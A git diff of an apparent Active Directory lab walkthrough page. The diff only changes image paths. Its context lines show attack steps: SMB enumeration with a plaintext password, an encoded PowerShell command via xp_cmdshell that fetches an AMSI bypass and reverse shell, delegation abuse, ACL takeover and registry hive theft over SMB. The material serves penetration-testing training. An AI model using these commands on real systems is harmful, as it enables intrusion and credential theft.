@@ -131,11 +131,11 @@ The account can access three hosts over SMB but unfortunately we aren't local ad
 crackmapexec smb 10.0.0.3 10.0.0.4 10.0.0.5 -u richard -p Sample123 --shares
 ```
 
-![](<../../../.gitbook/assets/image (54).png>)
+![](<../../../.gitbook/assets/image (54) (1).png>)
 
 The IPC$, NETLOGON and SYSVOL shares are default. There is one interesting share with the name `Data` on `FILE01`. After connecting to the share with smbclient we see that this user unfortunately can't access any of the subdirectories:
 
-![](<../../../.gitbook/assets/image (73) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (73) (1) (1) (1) (1).png>)
 
 2\. Next we can check if the user can access any systems with the winrm protocol:
 
@@ -332,7 +332,7 @@ EXEC xp_cmdshell 'powershell.exe -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIA
 
 5\. Now its time to execute the command and receive a shell. Amsi.txt and the reverse shell gets downloaded from the webserver and the shell comes in from `WEB01` as `NT service\mssql$dev`:
 
-![](<../../../.gitbook/assets/image (16) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (16) (1) (1) (1) (1).png>)
 
 ### 6. Privesc RBCD
 
@@ -373,7 +373,7 @@ Then we can create our own computerobject with the name `FAKE01` and password `1
 New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
 ```
 
-![](<../../../.gitbook/assets/image (73) (1) (1).png>)
+![](<../../../.gitbook/assets/image (73) (1) (1) (1).png>)
 
 3\. The third requirement is that the WebDav director is installed. We can check this with the following PowerShell command in the shell:
 
@@ -642,7 +642,7 @@ Get-DomainObject -Identity data01 -SecurityMasks Owner -Domain secure.local -Cre
 Get-DomainObject -Identity S-1-5-21-1498997062-1091976085-892328878-512 -Domain secure.local -Credential $creds -Server 10.0.0.100
 ```
 
-![](<../../../.gitbook/assets/image (73) (1).png>)
+![](<../../../.gitbook/assets/image (73) (1) (1).png>)
 
 7\. The current owner of `DATA01` is the Domain Admins group. Lets change that. We can change the owner of the object using the `Set-DomainObjectOwner` cmdlet. The command below will change the owner to `sa_sql`.
 
@@ -654,7 +654,7 @@ Set-DomainObjectOwner -Domain secure.local -Credential $creds -Server 10.0.0.100
 
 We didn't received any output, but we can execute the commands again to see who the owner is now.
 
-![](<../../../.gitbook/assets/image (19) (1).png>)
+![](<../../../.gitbook/assets/image (19) (1) (1).png>)
 
 The owner successfully changed.
 
@@ -664,7 +664,7 @@ The owner successfully changed.
 Add-DomainObjectAcl -Domain secure.local -Credential $creds -TargetDomain secure.local -TargetIdentity DATA01 -PrincipalDomain secure.local -PrincipalIdentity sa_sql -Rights All -Verbose
 ```
 
-![](<../../../.gitbook/assets/image (16) (1) (1).png>)
+![](<../../../.gitbook/assets/image (16) (1) (1) (1).png>)
 
 9\. We didn't reveive any output but now we can check the current permissions by running BloodHound again and ingesting the data:
 
@@ -721,7 +721,7 @@ $SDBytes = New-Object byte[] ($SD.BinaryLength)
 $SD.GetBinaryForm($SDBytes, 0)
 ```
 
-![](<../../../.gitbook/assets/image (16) (1).png>)
+![](<../../../.gitbook/assets/image (16) (1) (1).png>)
 
 14\. Now we can write as `sa_sql` to the `msds-allowedtoactonbehalfofotheridentity` attribute of the computerobject `DATA01`:
 
@@ -733,7 +733,7 @@ Get-DomainComputer DATA01 -Domain secure.local -Credential $creds -Server 10.0.0
 
 We didn't get any output since we are in a shell. But we can check the attribute again to see of it worked:
 
-![](<../../../.gitbook/assets/image (75).png>)
+![](<../../../.gitbook/assets/image (75) (1).png>)
 
 Seems like it worked, now we can check the value of the `msds-AllowedToActOnBehalfOfOtherIdentity` attribute by saving it in a variable and doing some PowerShell confu to decrypt it:
 
@@ -889,7 +889,7 @@ mkdir ~/adlab/share
 python3 /opt/impacket/examples/smbserver.py share ~/adlab/share -smb2support
 ```
 
-![](<../../../.gitbook/assets/image (27).png>)
+![](<../../../.gitbook/assets/image (27) (1).png>)
 
 3\. The next step is to execute the BackupOperatorToDa tool to retrieve the the SAM, SYSTEN and SECURITY HIVE and save them in our created public share. But first we have to download it on `DATA01` in the shell:
 
